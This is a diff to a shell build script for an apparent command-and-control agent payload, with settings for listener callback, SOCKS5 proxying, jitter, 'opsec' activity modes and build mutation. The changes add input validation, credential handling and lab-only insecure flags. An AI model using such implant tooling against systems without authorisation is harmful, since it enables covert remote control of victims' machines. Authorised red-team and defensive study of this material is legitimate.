@@ -11,10 +11,14 @@ OUTPUT_DIR="" # Primarily set by --output arg or derived
 BUILD_TYPE="release" # Primarily set by --build-type arg
 LISTENER_HOST="" # Primarily set by --listener-host arg
 LISTENER_PORT="" # Primarily set by --listener-port arg
+SERVER_URL=${SERVER_URL:-""}
 LISTENER_ID=${LISTENER_ID:-""}
 PAYLOAD_ID="" # Primarily set by --payload-id arg or derived
 PROTOCOL="" # Primarily set by --protocol arg or derived
 MUTATION_SEED=${MUTATION_SEED:-""} # Hex u64; empty means build.rs falls back to the fixed dev seed
+ENROLLMENT_CREDENTIAL=${ENROLLMENT_CREDENTIAL:-""}
+ALLOW_INSECURE_ISOLATED_LAB=${ALLOW_INSECURE_ISOLATED_LAB:-false}
+ALLOW_INVALID_CERTS=${ALLOW_INVALID_CERTS:-false}
 
 SLEEP_INTERVAL=${SLEEP_INTERVAL:-60}
 JITTER=${JITTER:-2}
@@ -217,6 +221,115 @@ else
     echo "Using determined PAYLOAD_ID: $PAYLOAD_ID"
 fi
 
+if [ -z "$ENROLLMENT_CREDENTIAL" ]; then
+    echo "Error: ENROLLMENT_CREDENTIAL is required for an agent payload build." >&2
+    exit 1
+fi
+if [ "${#ENROLLMENT_CREDENTIAL}" -ne 43 ] ||
+    [[ ! "$ENROLLMENT_CREDENTIAL" =~ ^[A-Za-z0-9_-]{43}$ ]] ||
+    [[ ! "${ENROLLMENT_CREDENTIAL: -1}" =~ ^[AEIMQUYcgkosw048]$ ]]; then
+    echo "Error: ENROLLMENT_CREDENTIAL must be a canonical 32-byte unpadded base64url credential." >&2
+    exit 1
+fi
+if [[ ! "$PROTOCOL" =~ ^https?$ ]]; then
+    echo "Error: PROTOCOL must be http or https." >&2
+    exit 1
+fi
+if [[ "$LISTENER_HOST" == \[* ]]; then
+    LISTENER_HOST_IS_VALID=false
+    if [[ "$LISTENER_HOST" =~ ^\[[0-9A-Fa-f:.%]+\]$ ]]; then
+        LISTENER_HOST_IS_VALID=true
+    fi
+elif [[ "$LISTENER_HOST" =~ ^[A-Za-z0-9._:%-]+$ ]]; then
+    LISTENER_HOST_IS_VALID=true
+else
+    LISTENER_HOST_IS_VALID=false
+fi
+if [ "$LISTENER_HOST_IS_VALID" != "true" ]; then
+    echo "Error: LISTENER_HOST must be a hostname or IP address without a scheme, port, path, or control characters." >&2
+    exit 1
+fi
+if [[ ! "$LISTENER_PORT" =~ ^[0-9]+$ ]] ||
+    [ "$LISTENER_PORT" -lt 1 ] ||
+    [ "$LISTENER_PORT" -gt 65535 ]; then
+    echo "Error: LISTENER_PORT must be between 1 and 65535." >&2
+    exit 1
+fi
+if [[ ! "$LISTENER_ID" =~ ^[A-Za-z0-9_.:-]{1,128}$ ]]; then
+    echo "Error: LISTENER_ID is required and must satisfy the identifier contract." >&2
+    exit 1
+fi
+if [[ ! "$PAYLOAD_ID" =~ ^[A-Za-z0-9_.:-]{1,128}$ ]]; then
+    echo "Error: PAYLOAD_ID must satisfy the identifier contract." >&2
+    exit 1
+fi
+if [[ "$SOCKS5_HOST" == \[* ]]; then
+    SOCKS5_HOST_IS_VALID=false
+    if [[ "$SOCKS5_HOST" =~ ^\[[0-9A-Fa-f:.%]+\]$ ]]; then
+        SOCKS5_HOST_IS_VALID=true
+    fi
+elif [[ "$SOCKS5_HOST" =~ ^[A-Za-z0-9._:%-]+$ ]]; then
+    SOCKS5_HOST_IS_VALID=true
+else
+    SOCKS5_HOST_IS_VALID=false
+fi
+if [ "$SOCKS5_HOST_IS_VALID" != "true" ]; then
+    echo "Error: SOCKS5_HOST must be a hostname or IP address." >&2
+    exit 1
+fi
+if [[ ! "$SOCKS5_PORT" =~ ^[0-9]+$ ]] ||
+    [ "$SOCKS5_PORT" -lt 1 ] ||
+    [ "$SOCKS5_PORT" -gt 65535 ]; then
+    echo "Error: SOCKS5_PORT must be between 1 and 65535." >&2
+    exit 1
+fi
+for unsigned_value in \
+    "$SLEEP_INTERVAL" "$JITTER" "$MIN_FULL_OPSEC_SECS" \
+    "$MIN_REDUCED_OPSEC_SECS" "$MIN_BG_OPSEC_SECS" \
+    "$REDUCED_ACTIVITY_SLEEP_SECS" "$BASE_MAX_C2_FAILS" \
+    "$C2_THRESH_ADJ_INTERVAL" "$PROC_SCAN_INTERVAL_SECS"; do
+    if [[ ! "$unsigned_value" =~ ^[0-9]+$ ]]; then
+        echo "Error: integer build settings must contain decimal digits only." >&2
+        exit 1
+    fi
+done
+for decimal_value in \
+    "$BASE_SCORE_THRESHOLD_BG_TO_REDUCED" \
+    "$BASE_SCORE_THRESHOLD_REDUCED_TO_FULL" \
+    "$C2_THRESH_INC_FACTOR" "$C2_THRESH_DEC_FACTOR" "$C2_THRESH_MAX_MULT"; do
+    if [[ ! "$decimal_value" =~ ^[0-9]+([.][0-9]+)?$ ]]; then
+        echo "Error: decimal build settings must be non-negative decimal numbers." >&2
+        exit 1
+    fi
+done
+if [ -n "$MUTATION_SEED" ] &&
+    [[ ! "$MUTATION_SEED" =~ ^(0x)?[0-9A-Fa-f]{1,16}$ ]]; then
+    echo "Error: MUTATION_SEED must be a hexadecimal u64." >&2
+    exit 1
+fi
+case "$ALLOW_INSECURE_ISOLATED_LAB" in
+    true|false) ;;
+    *)
+        echo "Error: ALLOW_INSECURE_ISOLATED_LAB must be true or false." >&2
+        exit 1
+        ;;
+esac
+case "$ALLOW_INVALID_CERTS" in
+    true|false) ;;
+    *)
+        echo "Error: ALLOW_INVALID_CERTS must be true or false." >&2
+        exit 1
+        ;;
+esac
+if [ "$PROTOCOL" != "https" ] && [ "$ALLOW_INSECURE_ISOLATED_LAB" != "true" ]; then
+    echo "Error: non-HTTPS agent payload builds require ALLOW_INSECURE_ISOLATED_LAB=true." >&2
+    exit 1
+fi
+if [ "$ALLOW_INVALID_CERTS" = "true" ] && [ "$ALLOW_INSECURE_ISOLATED_LAB" != "true" ]; then
+    echo "Error: ALLOW_INVALID_CERTS=true requires ALLOW_INSECURE_ISOLATED_LAB=true." >&2
+    exit 1
+fi
+
 # Also figure out the server's full path if OUTPUT_DIR was given
 if [ -n "$OUTPUT_DIR" ]; then
 SERVER_DIR=$(dirname $(dirname "$OUTPUT_DIR"))
@@ -261,26 +374,22 @@ AGENT_CONFIG_DIR_FOR_BUILD_RS=".config" # Relative to agent source root
 mkdir -p "$AGENT_CONFIG_DIR_FOR_BUILD_RS"
 CONFIG_JSON_PATH_FOR_BUILD_RS="${AGENT_CONFIG_DIR_FOR_BUILD_RS}/config.json"
 
-# Construct the server_url for the JSON. build.rs prefers env vars for this.
-# If LISTENER_HOST contains '://', assume it's a full URL. Otherwise, prepend protocol.
-if [[ "$LISTENER_HOST" == *"://"* ]]; then
-    CONFIG_SERVER_URL="$LISTENER_HOST:$LISTENER_PORT" # Port might be redundant if in host
-    # Refine if LISTENER_HOST includes port
-    if [[ "$LISTENER_HOST" == *":"* ]] && [[ "$LISTENER_HOST" != *"://"*":"* ]]; then # e.g. http://host but not http://host:port
-       CONFIG_SERVER_URL="$LISTENER_HOST:$LISTENER_PORT"
-    else # host is like "server.com" or "http://server.com:1234"
-       CONFIG_SERVER_URL="${PROTOCOL}://${LISTENER_HOST}:${LISTENER_PORT}"
-       if [[ "$LISTENER_HOST" == *"://"* ]]; then # if LISTENER_HOST was already full url like http://blah.com:port
-          CONFIG_SERVER_URL="$LISTENER_HOST" # Don't append protocol or port again if host is full url with port
-          # If it's http://blah.com (no port), then append port
-          if [[ "$LISTENER_HOST" != *":"* ]]; then # no port in the full url
-            CONFIG_SERVER_URL="$LISTENER_HOST:$LISTENER_PORT"
-          fi
-       fi
-    fi
+# Construct a canonical authority without ever interpolating unvalidated input
+# into JSON. Raw IPv6 literals are bracketed; already-bracketed literals stay
+# bracketed; hostnames and IPv4 addresses are unchanged.
+if [[ "$LISTENER_HOST" == \[*\] ]]; then
+    CONFIG_SERVER_AUTHORITY="${LISTENER_HOST}:${LISTENER_PORT}"
+elif [[ "$LISTENER_HOST" == *:* ]]; then
+    CONFIG_SERVER_AUTHORITY="[${LISTENER_HOST}]:${LISTENER_PORT}"
 else
-    CONFIG_SERVER_URL="${PROTOCOL}://${LISTENER_HOST}:${LISTENER_PORT}"
+    CONFIG_SERVER_AUTHORITY="${LISTENER_HOST}:${LISTENER_PORT}"
 fi
+CONFIG_SERVER_URL="${PROTOCOL}://${CONFIG_SERVER_AUTHORITY}"
+if [ -n "$SERVER_URL" ] && [ "$SERVER_URL" != "$CONFIG_SERVER_URL" ]; then
+    echo "Error: SERVER_URL does not match the validated listener host, port, and protocol." >&2
+    exit 1
+fi
+SERVER_URL="$CONFIG_SERVER_URL"
 
 
 CONFIG_JSON_CONTENT=$(cat << EOF
@@ -291,10 +400,13 @@ CONFIG_JSON_CONTENT=$(cat << EOF
     "payload_id": "${PAYLOAD_ID}",
     "agent_id": "",
     "listener_id": "${LISTENER_ID}",
+    "enrollment_credential": "",
     "protocol": "${PROTOCOL}",
     "socks5_enabled": ${SOCKS5_ENABLED},
     "socks5_host": "${SOCKS5_HOST}",
     "socks5_port": ${SOCKS5_PORT},
+    "allow_invalid_certs": ${ALLOW_INVALID_CERTS},
+    "allow_insecure_isolated_lab": ${ALLOW_INSECURE_ISOLATED_LAB},
     "base_score_threshold_bg_to_reduced": ${BASE_SCORE_THRESHOLD_BG_TO_REDUCED},
     "base_score_threshold_reduced_to_full": ${BASE_SCORE_THRESHOLD_REDUCED_TO_FULL},
     "min_duration_full_opsec_secs": ${MIN_FULL_OPSEC_SECS},
@@ -311,12 +423,15 @@ CONFIG_JSON_CONTENT=$(cat << EOF
 EOF
 )
 echo "$CONFIG_JSON_CONTENT" > "$CONFIG_JSON_PATH_FOR_BUILD_RS"
+chmod 600 "$CONFIG_JSON_PATH_FOR_BUILD_RS"
 echo "Created/Updated $CONFIG_JSON_PATH_FOR_BUILD_RS for build.rs fallback."
 
 # Also place it in the server-specified output directory for runtime fallback by the agent, if applicable
 if [ -n "$OUTPUT_DIR" ]; then
     mkdir -p "$OUTPUT_DIR/.config"
+    chmod 700 "$OUTPUT_DIR/.config"
     echo "$CONFIG_JSON_CONTENT" > "$OUTPUT_DIR/.config/config.json"
+    chmod 600 "$OUTPUT_DIR/.config/config.json"
     echo "Copied comprehensive config to $OUTPUT_DIR/.config/config.json for agent runtime fallback."
 fi
 
@@ -393,6 +508,7 @@ fi
 # These ensure build.rs gets the final, resolved values.
 export LISTENER_HOST="$LISTENER_HOST" # Actual host/IP for connection
 export LISTENER_PORT="$LISTENER_PORT" # Actual port
+export SERVER_URL="$SERVER_URL"
 export LISTENER_ID="$LISTENER_ID"
 export SLEEP_INTERVAL="$SLEEP_INTERVAL"
 export PAYLOAD_ID="$PAYLOAD_ID"
@@ -400,6 +516,9 @@ export PROTOCOL="$PROTOCOL" # Actual protocol
 export SOCKS5_ENABLED="$SOCKS5_ENABLED"
 export SOCKS5_HOST="$SOCKS5_HOST"
 export SOCKS5_PORT="$SOCKS5_PORT"
+export ENROLLMENT_CREDENTIAL="$ENROLLMENT_CREDENTIAL"
+export ALLOW_INSECURE_ISOLATED_LAB="$ALLOW_INSECURE_ISOLATED_LAB"
+export ALLOW_INVALID_CERTS="$ALLOW_INVALID_CERTS"
 
 # Only export when set; an unset MUTATION_SEED triggers the build.rs dev-seed fallback with a warning.
 if [ -n "$MUTATION_SEED" ]; then
@@ -425,6 +544,7 @@ export PROC_SCAN_INTERVAL_SECS="$PROC_SCAN_INTERVAL_SECS"
 echo "[ENV EXPORTS for build.rs] Set:"
 echo "  LISTENER_HOST: $LISTENER_HOST, LISTENER_PORT: $LISTENER_PORT, PROTOCOL: $PROTOCOL"
 echo "  PAYLOAD_ID: $PAYLOAD_ID, SLEEP_INTERVAL: $SLEEP_INTERVAL"
+echo "  ENROLLMENT_CREDENTIAL: <redacted>, ALLOW_INSECURE_ISOLATED_LAB: $ALLOW_INSECURE_ISOLATED_LAB"
 echo "  MIN_BG_OPSEC_SECS: $MIN_BG_OPSEC_SECS, REDUCED_ACTIVITY_SLEEP_SECS: $REDUCED_ACTIVITY_SLEEP_SECS"
 # Add more echos for other critical env vars if needed for debugging
 
@@ -449,10 +569,11 @@ if [ $BUILD_SUCCESS -ne 0 ]; then
 fi
 
 # Determine the build directory
+CARGO_TARGET_ROOT="${CARGO_TARGET_DIR:-target}"
 if [ "$BUILD_TYPE" == "debug" ]; then
-    CARGO_BUILD_DIR="target/$TARGET/debug"
+    CARGO_BUILD_DIR="$CARGO_TARGET_ROOT/$TARGET/debug"
 else
-    CARGO_BUILD_DIR="target/$TARGET/release" # Default to release
+    CARGO_BUILD_DIR="$CARGO_TARGET_ROOT/$TARGET/release" # Default to release
 fi
 
 # Print contents of build directory for debugging
